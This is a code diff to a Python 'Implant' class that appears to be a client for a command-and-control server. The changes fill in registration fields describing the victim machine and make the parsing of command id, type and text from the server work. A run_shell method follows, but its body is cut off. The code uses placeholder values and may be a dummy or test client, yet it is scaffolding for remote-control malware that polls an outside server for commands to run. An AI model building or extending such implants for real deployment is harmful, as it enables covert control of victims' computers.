@@ -13,7 +13,7 @@ class Implant():
         self.debug = debug
     
     def _gen_id(self):
-        mac_addr = "00:00:00:00:00:00"
+        mac_addr = "00:00:00:00:00:03"
         return hashlib.sha256(mac_addr.encode('utf-8')).hexdigest()
 
     def _print_debug_request(self, r):
@@ -30,9 +30,9 @@ class Implant():
             "computer_name": "dummyimplantcomputer",
             "computer_user": "some_user",  # (what user the implant is running as)
             "computer_guid": self._gen_id(),
-            "computer_privileges": 1,  # (that the implant has) - array of strings
+            "computer_privileges": ['strign1','string2'],  # (that the implant has) - array of strings
             "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
-            # "session_key": "dummy_session_key",  # (for crypto, eventually)
+            "session_key": "dummy_session_key",  # (for crypto, eventually)
         }
         r = requests.post(urljoin(self.c2_addr, "register"), json=data)
         if self.debug:
@@ -50,9 +50,9 @@ class Implant():
         if not res:
             return None, None, None
         parts = res
-        command_id = parts
-        command_type = parts
-        command = "   "
+        command_id = parts['command_id']
+        command_type = parts['command_type']
+        command = parts['command_text']
         return command_id, command_type, command
 
     def run_shell(self, command):
